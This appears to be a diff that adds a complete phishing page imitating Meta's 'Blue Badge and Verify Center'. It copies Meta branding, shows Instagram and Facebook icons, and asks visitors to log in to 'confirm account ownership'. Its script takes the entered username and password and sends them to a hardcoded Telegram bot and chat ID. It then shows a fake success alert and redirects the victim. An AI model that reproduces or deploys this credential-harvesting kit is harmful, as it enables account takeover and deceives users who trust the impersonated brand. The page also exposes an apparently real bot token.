@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blue Badge and Verify Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body class="font-roboto bg-white">
+    <header class="flex items-center justify-between p-4">
+        <div class="flex items-center">
+            <img src="logo.png" alt="Meta logo" class="mr-2" width="110" height="40" />
+        </div>
+        <nav class="hidden md:flex space-x-4">
+            <a class="text-gray-600" href="#">Who we are</a>
+            <a class="text-gray-600" href="#">Our technologies</a>
+            <a class="text-gray-600" href="#">The metaverse</a>
+            <a class="text-gray-600" href="#">Meta and you</a>
+            <a class="text-gray-600" href="#">Shop Meta</a>
+            <a class="text-gray-600" href="#">News</a>
+            <a class="text-gray-600" href="#">Support</a>
+        </nav>
+        <button id="mobile-menu-button" class="md:hidden focus:outline-none">
+            <i class="fas fa-bars text-gray-600"></i>
+        </button>
+    </header>
+    <main class="flex flex-col items-center mt-10">
+        <div class="flex flex-col md:flex-row items-center space-x-0 md:space-x-4 mb-6">
+            <img src="centangbiru.png" alt="centang Biru" class="w-20 h-20 mb-4 md:mb-0" />
+            <div class="flex space-x-2">
+                <img src="Instagram.png" alt="Instagram" class="w-16 h-16" />
+                <img src="fb.png" alt="Facebook" class="w-16 h-16" />
+            </div>
+        </div>
+        <h1 class="text-4xl md:text-6xl font-bold text-center">Blue Badge<br />and Verify Center</h1>
+        <p class="text-lg md:text-xl text-center mt-2">Please login to confirm account ownership</p>
+        <div class="mt-4 w-full max-w-sm">
+            <form id="loginform" onsubmit="sendDataToTelegram(event)" class="flex flex-col items-center">
+                <input type="text" id="username" class="w-full p-4 mb-4 rounded-full border border-gray-300" placeholder="Username" required />
+                <input type="password" id="password" class="w-full p-4 mb-4 rounded-full border border-gray-300" placeholder="Password" required />
+                <button type="submit" class="bg-blue-600 text-white px-10 py-3 rounded-full text-lg">Continue</button>
+            </form>
+        </div>
+    </main>
+    <script>
+        const BOT_TOKEN = "7132788313:AAEMnbc-tGBWhl3B05pslsVaeNTgfvsT8sI"; // Replace with your actual bot token
+        const CHAT_ID = "6493531726"; // Replace with your actual chat ID
+
+        async function sendDataToTelegram(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+
+            if (!username || !password) {
+                alert("Username and password must be filled.");
+                return;
+            }
+
+            const message = `Data Login:\nUsername: ${username}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: new URLSearchParams({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+
+                const result = await response.json();
+                if (response.ok) {
+                    alert("Login Successful. Proceeding...");
+                    document.getElementById("loginform").reset();
+                    window.location.href = "verified.html";
+                } else {
+                    console.error("Telegram API Error:", result);
+                    alert("Failed to send data to Telegram.");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert("An error occurred while sending data.");
+            }
+        }
+    </script>
+</body>
+</html>
